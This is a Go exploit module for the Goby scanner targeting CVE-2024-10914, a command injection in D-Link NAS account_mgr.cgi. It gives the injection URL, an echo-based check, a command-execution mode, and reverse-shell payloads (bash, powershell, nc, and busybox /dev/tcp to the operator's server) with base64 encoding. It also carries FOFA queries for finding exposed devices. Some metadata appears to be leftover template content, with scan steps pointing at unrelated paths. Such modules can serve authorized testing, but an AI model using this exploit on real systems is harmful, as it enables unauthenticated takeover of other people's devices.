package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "D-Link NAS /cgi-bin/account_mgr.cgi Command Execution Vulnerability (CVE-2024-10914)",
    "Description": "<p>A critical vulnerability (CVE-2024-10914) in D-Link NAS devices poses a serious threat to more than 61,000 systems worldwide. The vulnerability is a command injection vulnerability in the account_mgr.cgi script that allows a remote attacker to execute arbitrary commands through a specially crafted HTTP GET request. This issue affects multiple D-Link NAS models, including DNS-320, DNS-320LW, DNS-325, and DNS-340L, and has a CVSSv4 score of 9.2, indicating a high severity. The vulnerability mainly affects the name parameter in the cgi_user_add command of the account_mgr.cgi script. Due to insufficient input validation filtering, malicious commands injected into the name parameter can lead to unauthorized command execution. Allowing attackers to access without authentication.</p>",
    "Product": "dlink-nas",
    "Homepage": "https://www.dlink.com.cn/",
    "DisclosureDate": "2024-11-12",
    "PostTime": "2024-11-14",
    "Author": "1251220046@qq.com",
    "FofaQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "GobyQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated: <a href=\"http://www.dlink.com.cn2.\">www.dlink.com.cn</a></p><p><a href=\"http://www.dlink.com.cn2.\"></a>2. Set access policies through firewalls and other security devices, and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/143696244"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "Mode=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tools_command.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "cmb_header=&txt_command=pwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-10914"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.2",
    "Translation": {
        "CN": {
            "Name": "D-Link NAS /cgi-bin/account_mgr.cgi 命令执行漏洞 （CVE-2024-10914）",
            "Product": "dlink-nas",
            "Description": "<p>D-Link NAS 设备中的一个关键漏洞（CVE-2024-10914），对全球 61,000 多个系统构成严重威胁。该漏洞是 account_mgr.cgi脚本中的命令注入漏洞，允许远程攻击者通过特制的 HTTP GET 请求执行任意命令。此问题影响多个 D-Link NAS 型号，包括 DNS-320、DNS-320LW、DNS-325 和 DNS-340L，CVSSv4 得分为 9.2，表明严重程度较高。该漏洞主要影响account_mgr.cgi脚本的cgi_user_add命令中的name 参数。由于输入验证过滤不充分，注入name参数的恶意命令可导致未经授权的命令执行。使攻击者无需身份验证即可访问。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.dlink.com.cn\">www.dlink.com.cn</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "D-Link NAS /cgi-bin/account_mgr.cgi Command Execution Vulnerability (CVE-2024-10914)",
            "Product": "dlink-nas",
            "Description": "<p>A critical vulnerability (CVE-2024-10914) in D-Link NAS devices poses a serious threat to more than 61,000 systems worldwide. The vulnerability is a command injection vulnerability in the account_mgr.cgi script that allows a remote attacker to execute arbitrary commands through a specially crafted HTTP GET request. This issue affects multiple D-Link NAS models, including DNS-320, DNS-320LW, DNS-325, and DNS-340L, and has a CVSSv4 score of 9.2, indicating a high severity. The vulnerability mainly affects the name parameter in the cgi_user_add command of the account_mgr.cgi script. Due to insufficient input validation filtering, malicious commands injected into the name parameter can lead to unauthorized command execution. Allowing attackers to access without authentication.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep updated: <a href=\"http://www.dlink.com.cn2.\">www.dlink.com.cn</a></p><p><a href=\"http://www.dlink.com.cn2.\"></a>2. Set access policies through firewalls and other security devices, and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily executecode on the server side, write backdoors, obtain serverpermissions, and then control the entire server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|CommandExecEcho"
    },
    "EditType": "fast",
    "PocId": "9971"
}`
	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		vulPath := "/cgi-bin/account_mgr.cgi"

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfig := httpclient.NewGetRequestConfig(url)
			getRequestConfig.VerifyTls = false      // 不验证TLS证书
			getRequestConfig.FollowRedirect = false // 不跟随重定向

			// 设置请求头
			for headName, headValue := range head {
				getRequestConfig.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		}

		getHeader := map[string]string{}

		urlGet := "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;" + url.QueryEscape(command) + ";%27"

		// 发包
		resp, err := setGetRequest(hostInfo, urlGet, getHeader)
		// 检查发包错误
		if err != nil {
			return "", "", err
		}

		if resp == nil || resp.StatusCode != 200 {
			return "", "", errors.New("RCE Fail")
		}

		regStr := `([^'"]+)Content-type: text/html`
		regObj := regexp.MustCompile(regStr)
		if !regObj.MatchString(resp.RawBody) {
			return "", "", errors.New("RCE Fail")
		}
		reResult := regObj.FindStringSubmatch(resp.RawBody)

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := reResult[1]
    
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},

		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["Mode"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
